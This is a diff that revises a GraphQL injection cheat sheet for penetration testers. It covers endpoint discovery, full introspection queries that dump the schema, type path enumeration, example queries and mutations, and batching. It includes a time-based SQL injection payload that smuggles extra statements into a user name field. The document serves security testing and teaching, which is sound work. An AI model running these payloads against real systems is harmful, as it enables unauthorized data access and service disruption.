@@ -11,11 +11,12 @@
     - [Enumerate Database Schema via Introspection](#enumerate-database-schema-via-introspection)
     - [Enumerate Database Schema via Suggestions](#enumerate-database-schema-via-suggestions)
     - [Enumerate Types Definition](#enumerate-types-definition)
-    - [List Path To Reach A Type](#list-path-to-reach-a-type)
+    - [Enumerating Paths to a Target Type](#enumerating-paths-to-a-target-type)
 - [Methodology](#methodology)
-    - [Extract Data](#extract-data)
-    - [Extract Data Using Edges/Nodes](#extract-data-using-edgesnodes)
-    - [Extract Data Using Projections](#extract-data-using-projections)
+    - [Queries](#queries)
+        - [Basic Query](#basic-query)
+        - [Query with Arguments](#query-with-arguments)
+        - [Nested Queries](#nested-queries)
     - [Mutations](#mutations)
     - [GraphQL Batching Attacks](#graphql-batching-attacks)
         - [JSON List Based Batching](#json-list-based-batching)
@@ -46,8 +47,12 @@
 
 ### Common GraphQL Endpoints
 
-Most of the time GraphQL is located at the `/graphql` or `/graphiql` endpoint.
-A more complete list is available at [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt).
+GraphQL endpoints are often exposed at predictable paths, most commonly:
+
+- `/graphql`
+- `/graphiql` (interactive IDE)
+
+You should always probe for both API and developer/debug interfaces.
 
 ```ps1
 /v1/explorer
@@ -60,12 +65,32 @@ A more complete list is available at [danielmiessler/SecLists/graphql.txt](https
 /graphiql.php
 ```
 
+For an extended wordlist, see [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt).
+
 ### Identify An Injection Point
 
-```js
-example.com/graphql?query={__schema{types{name}}}
-example.com/graphiql?query={__schema{types{name}}}
-```
+> A server MUST accept POST requests, and MAY accept other HTTP methods, such as GET. - [GraphQL Over HTTP](https://graphql.github.io/graphql-over-http/draft/#sec-Request)
+
+- GET endpoint
+
+    ```js
+    GET /graphql?query={yourQueryHere}
+    GET /graphql?query={__schema{types{name}}}
+    GET /graphiql?query={__schema{types{name}}}
+    GET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D
+    ```
+
+- POST endpoint
+
+    ```js
+    POST /graphql/v1 HTTP/1.1
+    Host: example.com
+    Content-Type: application/json
+
+    {
+    "query": "query { user { id name } }"
+    }
+    ```
 
 Check if errors are visible.
 
@@ -77,6 +102,18 @@ Check if errors are visible.
 
 ### Enumerate Database Schema via Introspection
 
+The GraphQL specification includes special fields, such as `__schema` and `__type`, that allow clients to ask the server what types exist, what fields they expose, and how everything connects together.
+
+An introspection query is simply a request that leverages these special fields to retrieve that structural information. This is what allows interactive environments like GraphiQL or GraphQL Playground to provide auto-completion, inline documentation, and query validation. When a developer types a query, the tool is not guessing, it has already asked the server what is valid and what is not.
+
+A minimal example looks like this:
+
+```js
+{
+  "query": "{ __schema { types { name } } }"
+}
+```
+
 URL encoded query to dump the database schema.
 
 ```js
@@ -85,7 +122,7 @@ fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated
 
 URL decoded query to dump the database schema.
 
-```javascript
+```rs
 fragment FullType on __Type {
   kind
   name
@@ -184,11 +221,11 @@ query IntrospectionQuery {
 
 Single line queries to dump the database schema without fragments.
 
-```js
+```rs
 __schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
 ```
 
-```js
+```rs
 {__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
 ```
 
@@ -212,11 +249,16 @@ Enumerate the definition of interesting types using the following GraphQL query,
 {__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
 ```
 
-### List Path To Reach A Type
+### Enumerating Paths to a Target Type
+
+When working with a GraphQL schema, especially after running an introspection query, it is not always obvious how a specific type can be accessed through queries. A given object (like `User`, `Admin`, or `Payment`) may be reachable through multiple entry points and nested relationships.
+
+- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Tool that lists the different ways of reaching a given type in a GraphQL schema.
+
+This tool takes the JSON output of an introspection query (which describes the full schema) and analyzes how types are connected. It then outputs different query paths that can be used to reach a specific target type. In practice, this means identifying all the possible ways a client could craft queries that eventually return that object, even if it is deeply nested or indirectly exposed.
 
 ```php
-$ git clone https://gitlab.com/dee-see/graphql-path-enum
-$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
+graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
 Found 27 ways to reach the "Skill" node from the "Query" node:
 - Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
 - Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
@@ -237,46 +279,93 @@ Found 27 ways to reach the "Skill" node from the "Query" node:
 
 ## Methodology
 
-### Extract Data
+GraphQL supports three main operation types: **queries**, **mutations**, and **subscriptions**.
+
+### Queries
+
+GraphQL queries are used to request specific fields from a schema, and the structure of your query directly mirrors the JSON response you will receive. At its simplest, querying data means selecting a root field (like `user`, `posts`, or `teams`) and then specifying which subfields you want returned. Unlike REST, you never get extra data, everything must be explicitly requested.
+
+#### Basic Query
+
+The simplest query uses the shorthand syntax, where the `query` keyword is omitted. You just define the fields you want starting from the root object.
 
 ```js
-example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
+{
+  user {
+    id
+    name
+  }
+}
+```
+
+This tells the server to return the `id` and `name` fields from the user object. The response will follow the exact same structure. If needed, the full syntax can be used with the query keyword, but in most cases the shorthand is enough and commonly seen in real-world traffic.
+
+```js
+query {
+  user {
+    id
+    name
+  }
+}
 ```
 
 ![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)
 
-### Extract Data Using Edges/Nodes
+#### Query with Arguments
 
-```json
-{
-  "query": "query {
-    teams{
-      total_count,edges{
-        node{
-          id,_id,about,handle,state
-        }
-      }
-    }
-  }"
-} 
-```
-
-### Extract Data Using Projections
-
-:warning: Don’t forget to escape the " inside the **options**.
+To retrieve specific data, arguments can be passed to fields. These behave like function parameters and are often used for IDs, filters, or search queries.
 
 ```js
-{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
+{
+  user(id: "1") {
+    name
+    email
+  }
+}
+```
+
+This allows precise targeting of objects and is a common entry point for testing access control issues or IDOR-style vulnerabilities.
+
+#### Nested Queries
+
+GraphQL allows deep traversal of relationships in a single request. Instead of chaining multiple API calls, you can explore linked objects directly.
+
+```js
+{
+  user(id: "1") {
+    name
+    posts {
+      title
+      comments {
+        content
+      }
+    }
+  }
+}
 ```
 
 ### Mutations
 
-Mutations work like function, you can use them to interact with the GraphQL.
+A mutation is an operation used to change data on the server (create, update, or delete something).
+Mutations work like function, you can use them to interact with the GraphQL endpoint.
 
 ```javascript
-# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
-# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
+mutation{
+  signIn(login:"Admin", password:"secretp@ssw0rd"){
+      token
+    }
+}
+
+mutation{
+  addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {
+    id
+    name
+    email
+  }
+}
 ```
+
+**Warning**: Mutations usually won't work with GET. [graphql/graphql-over-http, issue #123](https://github.com/graphql/graphql-over-http/issues/123)
 
 ### GraphQL Batching Attacks
 
@@ -364,7 +453,12 @@ Send a single quote `'` inside a GraphQL parameter to trigger the SQL injection
 Simple SQL injection inside a GraphQL field.
 
 ```powershell
-curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
+query {
+  user(name: "patt';SELECT 1;SELECT pg_sleep(30);--'") {
+    id
+    email
+  }
+}
 ```
 
 ## Labs
